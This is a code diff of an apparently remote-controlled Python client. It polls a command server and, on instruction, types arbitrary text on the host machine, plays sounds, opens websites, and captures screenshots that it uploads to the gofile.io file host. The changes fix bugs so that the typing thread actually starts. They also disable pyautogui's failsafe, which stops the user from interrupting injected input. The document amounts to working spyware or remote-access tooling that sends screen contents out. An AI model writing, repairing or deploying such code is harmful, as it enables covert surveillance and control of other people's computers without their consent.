@@ -1,7 +1,6 @@
 from requests import RequestException, Response, post, get
 from subprocess import CREATE_NEW_CONSOLE, Popen
 from PIL import UnidentifiedImageError, Image
-from pyautogui import screenshot, typewrite
 from fleep import get as get_soundtype
 from playsound import playsound
 from os import remove, getenv
@@ -11,6 +10,7 @@ from time import time, sleep
 from os import getcwd, chdir
 from random import choices
 from sys import exit
+import pyautogui
 
 
 DELAY = 5
@@ -19,6 +19,7 @@ PORT = 80
 SCHEME = "http"
 CONNECT_TIMEOUT = 5
 connected: bool = False
+pyautogui.FAILSAFE = False
 
 
 def main() -> None:
@@ -89,7 +90,9 @@ def main() -> None:
             if playsound_response.status_code == 200:
                 play_sound(playsound_response.content)
             if typestring_response.status_code == 200:
-                Thread(target=write_thread, args=[typestring_response.json()])
+                Thread(
+                    target=typestring_thread, args=[typestring_response.json()]
+                ).start()
 
             if not connected:
                 print("Connected and asked server for actions.")
@@ -112,17 +115,17 @@ def main() -> None:
         main()
 
 
-def write_thread(response_json: dict) -> None:
+def typestring_thread(response_json: dict) -> None:
     try:
         typed_text = response_json.get("text")
         delay = response_json.get("delay")
-        typewrite(typed_text, delay)
+        pyautogui.typewrite(typed_text, delay)
     except Exception as error:
         print(error)
 
 
 def play_sound(soundfile_data: bytes) -> None:
-    old_cd = getcwd
+    old_cd = getcwd()
     chdir(getenv("temp"))
     sound_type = get_soundtype(soundfile_data).extension[0]
     filename = (
@@ -150,7 +153,7 @@ def open_website(url: str) -> None:
 def post_screenshot() -> None:
     old_cd = getcwd()
     chdir(getenv("temp"))
-    screenshot().save("temp.png", "png")
+    pyautogui.screenshot().save("temp.png", "png")
     upload_url = (
         "https://"
         + get("https://api.gofile.io/getServer").json().get("data").get("server")
